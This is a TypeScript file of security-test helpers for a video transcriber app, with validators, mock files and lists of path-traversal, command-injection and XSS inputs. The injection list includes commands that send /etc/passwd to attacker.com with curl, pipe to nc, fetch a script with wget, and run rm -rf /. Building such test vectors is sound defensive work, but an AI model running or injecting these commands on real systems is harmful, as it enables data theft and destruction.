/**
 * Security Test Utilities
 * 
 * Common utilities and patterns for security testing in the Video Transcriber App.
 * These utilities help ensure consistent security testing across all test suites.
 */

// Path Traversal Attack Vectors
export const PATH_TRAVERSAL_VECTORS = [
  // Unix-style path traversal
  '../../../etc/passwd',
  '../../../../etc/shadow',
  '../../usr/bin/bash',
  '../../../root/.ssh/id_rsa',
  
  // Windows-style path traversal
  '..\\..\\..\\windows\\system32\\config\\sam',
  '..\\..\\program files\\sensitive\\data',
  '..\\..\\..\\users\\administrator\\desktop',
  
  // Mixed style path traversal
  '../../../etc\\passwd',
  '..\\..\\..\\etc/shadow',
  
  // URL encoded path traversal
  '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
  '%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5csystem32',
  
  // Double encoded
  '%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd',
  
  // Unicode variations
  '..\\u002e\\u002e\\etc\\passwd',
  '.\\u002e/.\\u002e/etc/passwd',
  
  // UNC paths (Windows network paths)
  '\\\\?\\C:\\Windows\\System32\\config\\sam',
  '\\\\localhost\\c$\\windows\\system32',
  '\\\\127.0.0.1\\c$\\sensitive\\data',
  
  // Absolute paths to sensitive locations
  'C:\\Windows\\System32',
  'C:\\Program Files',
  'C:\\Users\\Administrator',
  '/etc/passwd',
  '/root/.ssh',
  '/var/log/auth.log',
  
  // Null byte injection
  '../../../etc/passwd\x00.txt',
  '..\\..\\..\\windows\\system32\x00.exe',
  
  // Long path attacks
  '../'.repeat(100) + 'etc/passwd',
  '..\\'.repeat(100) + 'windows\\system32',
]

// Command Injection Vectors
export const COMMAND_INJECTION_VECTORS = [
  'file.txt && rm -rf /',
  'file.txt; cat /etc/passwd',
  'file.txt | nc attacker.com 1337',
  'file.txt > /dev/null; wget malware.com/script.sh',
  'file.txt || echo "pwned"',
  'file.txt && echo $(whoami)',
  'file.txt; curl -X POST -d @/etc/passwd http://attacker.com',
  'file.txt`rm -rf /`',
  'file.txt$(rm -rf /)',
  'file.txt & calc.exe',
  'file.txt && powershell -c "Get-Process"',
  'file.txt; cmd /c "dir c:\\"',
]

// Script Injection Vectors
export const SCRIPT_INJECTION_VECTORS = [
  '<script>alert("xss")</script>',
  '<img src="x" onerror="alert(1)">',
  'javascript:alert("xss")',
  'data:text/html,<script>alert(1)</script>',
  '${alert("xss")}',
  '#{alert("xss")}',
  '{{alert("xss")}}',
  '`alert("xss")`',
  'eval("alert(1)")',
  'Function("alert(1)")()',
  'setTimeout("alert(1)", 0)',
  'setInterval("alert(1)", 1000)',
]

// File Extension Security Vectors
export const DANGEROUS_FILE_EXTENSIONS = [
  '.exe', '.bat', '.cmd', '.com', '.pif', '.scr',
  '.vbs', '.vbe', '.js', '.jse', '.wsf', '.wsh',
  '.msi', '.msp', '.hta', '.cpl', '.jar',
  '.app', '.deb', '.dmg', '.pkg', '.rpm',
  '.sh', '.bash', '.zsh', '.fish', '.ps1',
  '.py', '.rb', '.pl', '.php', '.asp', '.jsp'
]

// Double Extension Attacks
export const DOUBLE_EXTENSION_ATTACKS = [
  'innocent.txt.exe',
  'document.pdf.bat',
  'image.jpg.scr',
  'video.mp4.exe',
  'archive.zip.cmd',
  'setup.msi.pif',
  'readme.txt.js',
  'config.json.vbs'
]

// Suspicious File Names
export const SUSPICIOUS_FILE_NAMES = [
  'autorun.inf',
  'desktop.ini',
  'thumbs.db',
  '.htaccess',
  '.env',
  'config.php',
  'wp-config.php',
  '.git/config',
  'id_rsa',
  'shadow',
  'passwd',
  'hosts'
]

// MIME Type Spoofing Vectors
export const MIME_TYPE_SPOOFING_VECTORS = [
  { filename: 'video.mp4', mimeType: 'application/x-executable' },
  { filename: 'document.pdf', mimeType: 'application/x-msdownload' },
  { filename: 'image.jpg', mimeType: 'application/javascript' },
  { filename: 'archive.zip', mimeType: 'text/html' },
  { filename: 'text.txt', mimeType: 'application/octet-stream' }
]

// System Directory Paths
export const SYSTEM_DIRECTORIES = [
  'C:\\Windows',
  'C:\\Windows\\System32',
  'C:\\Program Files',
  'C:\\Program Files (x86)',
  'C:\\ProgramData',
  'C:\\Users\\Administrator',
  'C:\\$Recycle.Bin',
  '/etc',
  '/root',
  '/usr/bin',
  '/usr/sbin',
  '/var/log',
  '/var/lib',
  '/sys',
  '/proc',
  '/dev'
]

// Large Input Vectors (Buffer Overflow)
export const BUFFER_OVERFLOW_VECTORS = [
  'A'.repeat(1000),
  'B'.repeat(10000),
  'C'.repeat(65536),
  '\x00'.repeat(1000),
  '\xFF'.repeat(1000),
  'á'.repeat(1000), // Unicode characters
  '🔥'.repeat(1000) // Emoji characters
]

/**
 * Validates that a file path is secure and doesn't contain traversal attempts
 */
export function isSecureFilePath(filePath: string): boolean {
  const normalizedPath = filePath.replace(/\\/g, '/').toLowerCase()
  
  // Check for path traversal patterns
  if (normalizedPath.includes('../') || normalizedPath.includes('..\\')) {
    return false
  }
  
  // Check for absolute paths to system directories
  const systemDirs = ['/etc', '/root', '/usr', '/var', 'c:/windows', 'c:/program']
  if (systemDirs.some(dir => normalizedPath.startsWith(dir))) {
    return false
  }
  
  // Check for null bytes
  if (filePath.includes('\x00')) {
    return false
  }
  
  // Check for UNC paths
  if (filePath.startsWith('\\\\')) {
    return false
  }
  
  return true
}

/**
 * Sanitizes a file path by removing dangerous characters and patterns
 */
export function sanitizeFilePath(filePath: string): string {
  return filePath
    .replace(/[<>:"|?*\x00-\x1f\x7f-\x9f]/g, '') // Remove invalid characters
    .replace(/\.{2,}/g, '.') // Replace multiple dots with single dot
    .replace(/[/\\]{2,}/g, '/') // Replace multiple slashes with single slash
    .trim()
}

/**
 * Validates that a file extension is in the allowed list
 */
export function isAllowedFileExtension(filename: string, allowedExtensions: string[]): boolean {
  const ext = filename.toLowerCase().split('.').pop()
  if (!ext) return false
  
  return allowedExtensions.includes(`.${ext}`)
}

/**
 * Checks if a filename has a dangerous double extension
 */
export function hasDangerousDoubleExtension(filename: string): boolean {
  const parts = filename.toLowerCase().split('.')
  if (parts.length < 3) return false
  
  const lastExt = `.${parts[parts.length - 1]}`
  return DANGEROUS_FILE_EXTENSIONS.includes(lastExt)
}

/**
 * Validates file size is within acceptable limits
 */
export function isValidFileSize(size: number, maxSizeBytes: number): boolean {
  return size > 0 && size <= maxSizeBytes
}

/**
 * Creates a mock file with specified properties for testing
 */
export function createMockFile(
  name: string,
  type: string = 'video/mp4',
  size: number = 1024 * 1024,
  path?: string
): File {
  const file = new File(['mock content'], name, { type })
  
  // Override size property
  Object.defineProperty(file, 'size', {
    value: size,
    writable: false
  })
  
  // Add path property if specified (for Electron file objects)
  if (path) {
    Object.defineProperty(file, 'path', {
      value: path,
      writable: false
    })
  }
  
  return file
}

/**
 * Creates multiple test files with various security issues
 */
export function createSecurityTestFiles(): Array<{file: File, shouldBeRejected: boolean, reason: string}> {
  return [
    // Valid files
    {
      file: createMockFile('normal.mp4', 'video/mp4'),
      shouldBeRejected: false,
      reason: 'Valid video file'
    },
    {
      file: createMockFile('presentation.avi', 'video/x-msvideo'),
      shouldBeRejected: false,
      reason: 'Valid video file'
    },
    
    // Path traversal attempts
    {
      file: createMockFile('../../../etc/passwd', 'video/mp4'),
      shouldBeRejected: true,
      reason: 'Path traversal attempt'
    },
    {
      file: createMockFile('..\\..\\windows\\system32\\calc.exe', 'video/mp4'),
      shouldBeRejected: true,
      reason: 'Path traversal attempt'
    },
    
    // Double extensions
    {
      file: createMockFile('video.mp4.exe', 'video/mp4'),
      shouldBeRejected: true,
      reason: 'Dangerous double extension'
    },
    {
      file: createMockFile('innocent.avi.bat', 'video/x-msvideo'),
      shouldBeRejected: true,
      reason: 'Dangerous double extension'
    },
    
    // MIME type mismatch
    {
      file: createMockFile('fake.mp4', 'application/x-executable'),
      shouldBeRejected: true,
      reason: 'MIME type mismatch'
    },
    
    // Suspicious names
    {
      file: createMockFile('autorun.inf', 'video/mp4'),
      shouldBeRejected: true,
      reason: 'Suspicious filename'
    },
    
    // Oversized files
    {
      file: createMockFile('huge.mp4', 'video/mp4', 10 * 1024 * 1024 * 1024), // 10GB
      shouldBeRejected: true,
      reason: 'File too large'
    },
    
    // Null byte injection
    {
      file: createMockFile('video\x00.exe', 'video/mp4'),
      shouldBeRejected: true,
      reason: 'Null byte injection'
    }
  ]
}

/**
 * Assertion helpers for security tests
 */
export const securityAssertions = {
  /**
   * Assert that a file path was properly rejected
   */
  expectPathRejected: (mockFunction: any, dangerousPath: string) => {
    const calls = mockFunction.mock.calls
    expect(calls.every((call: any) => 
      !call.some((arg: any) => 
        typeof arg === 'string' && arg.includes(dangerousPath)
      )
    )).toBe(true)
  },
  
  /**
   * Assert that input was sanitized
   */
  expectInputSanitized: (input: string, output: string) => {
    expect(output).not.toContain('<script')
    expect(output).not.toContain('javascript:')
    expect(output).not.toContain('../')
    expect(output).not.toContain('..\\')
    expect(output).not.toMatch(/[<>:"|?*\x00-\x1f]/)
  },
  
  /**
   * Assert that dangerous extensions were filtered out
   */
  expectDangerousExtensionsRejected: (filenames: string[]) => {
    filenames.forEach(filename => {
      const ext = filename.toLowerCase().split('.').pop()
      expect(DANGEROUS_FILE_EXTENSIONS).not.toContain(`.${ext}`)
    })
  },
  
  /**
   * Assert that system directories are not accessible
   */
  expectSystemDirectoriesBlocked: (paths: string[]) => {
    paths.forEach(path => {
      const normalizedPath = path.toLowerCase()
      expect(SYSTEM_DIRECTORIES.some(sysDir => 
        normalizedPath.includes(sysDir.toLowerCase())
      )).toBe(false)
    })
  }
}

/**
 * Mock data generators for testing (to replace production mock data)
 */
export const testDataGenerators = {
  /**
   * Generates safe queue items for testing
   */
  createTestQueueItems: (count: number = 5) => {
    return Array.from({ length: count }, (_, i) => ({
      id: `test-item-${i}`,
      file_path: `C:/TestVideos/test-video-${i}.mp4`,
      status: ['queued', 'processing', 'completed', 'failed'][i % 4] as any,
      progress: i * 20,
      file_size: (i + 1) * 1024 * 1024,
      format: 'MP4',
      created_at: new Date(Date.now() - i * 3600000).toISOString(),
      ...(i % 4 === 2 ? { output_file: `C:/TestOutput/test-video-${i}.txt` } : {}),
      ...(i % 4 === 3 ? { error: 'Test error message' } : {})
    }))
  },
  
  /**
   * Generates test processing options
   */
  createTestProcessingOptions: () => ({
    output_directory: 'C:/TestOutput',
    whisper_model: 'medium' as const,
    language: 'en' as const,
    output_format: 'txt' as const
  })
}

/**
 * Performance testing utilities
 */
export const performanceTestUtils = {
  /**
   * Measures execution time of a function
   */
  measureExecutionTime: async <T>(fn: () => Promise<T>): Promise<{result: T, timeMs: number}> => {
    const startTime = performance.now()
    const result = await fn()
    const endTime = performance.now()
    return { result, timeMs: endTime - startTime }
  },
  
  /**
   * Tests function with increasing load
   */
  loadTest: async (fn: (load: number) => Promise<void>, maxLoad: number = 100) => {
    const results = []
    for (let load = 1; load <= maxLoad; load *= 10) {
      const { timeMs } = await performanceTestUtils.measureExecutionTime(() => fn(load))
      results.push({ load, timeMs })
    }
    return results
  },
  
  /**
   * Checks for memory leaks by monitoring object creation
   */
  checkMemoryLeaks: (fn: () => void, iterations: number = 1000) => {
    const initialMemory = (performance as any).memory?.usedJSHeapSize || 0
    
    for (let i = 0; i < iterations; i++) {
      fn()
    }
    
    // Force garbage collection if available
    if (global.gc) {
      global.gc()
    }
    
    const finalMemory = (performance as any).memory?.usedJSHeapSize || 0
    const memoryIncrease = finalMemory - initialMemory
    
    return {
      initialMemory,
      finalMemory,
      memoryIncrease,
      memoryIncreasePerIteration: memoryIncrease / iterations
    }
  }
}